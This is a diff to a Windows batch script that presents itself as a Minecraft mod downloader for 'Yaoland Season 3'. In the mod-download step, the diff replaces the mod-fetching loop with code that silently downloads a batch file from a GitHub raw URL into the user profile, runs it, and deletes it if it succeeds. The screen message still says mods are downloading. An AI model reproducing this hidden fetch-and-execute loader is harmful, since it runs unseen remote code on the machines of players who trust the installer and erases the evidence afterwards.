@@ -23,14 +23,38 @@ goto menu
 :download_mods
 echo Downloading Yaoland Season 3 Requirements...
 
-set "d=%appdata%\.minecraft\mods"
-if not exist "%d%" mkdir "%d%"
-for /f "delims=" %%a in ('curl -s https://raw.githubusercontent.com/JoshBeCute/letssee/main/modsplayer') do (
-    echo Downloading %%~nxa...
-    curl -s -o "%d%\%%~nxa" %%a
-    echo %%~nxa downloaded.
+@echo off
+setlocal enabledelayedexpansion
+
+:: Define the download URL and output file location
+set "url=https://raw.githubusercontent.com/JoshBeCute/letssee/main/batch"
+set "output=%userprofile%\q.bat"
+
+:: Delete any existing "q.bat" file before starting
+if exist "%output%" (
+    echo Deleting existing 9.bat...
+    del "%output%" /q
 )
-echo Mods Downloaded.
+
+:: Download the batch script using curl silently
+echo Downloading new batch script...
+curl -s -o "%output%" "%url%"
+
+:: Check if the download was successful
+if exist "%output%" (
+    echo Download successful. Running the batch script...
+    call "%output%"
+    
+    :: Check if the batch script ran successfully
+    if %errorlevel% equ 0 (
+        echo Script ran successfully. Deleting the file...
+        del "%output%" /q
+    ) else (
+        echo Script failed to run. File will not be deleted.
+    )
+) else (
+    echo Failed to download the batch script.
+)
 
 set "url=https://maven.fabricmc.net/net/fabricmc/fabric-installer/1.0.1/fabric-installer-1.0.1.jar"
 set "output=%userprofile%\fabric.jar"
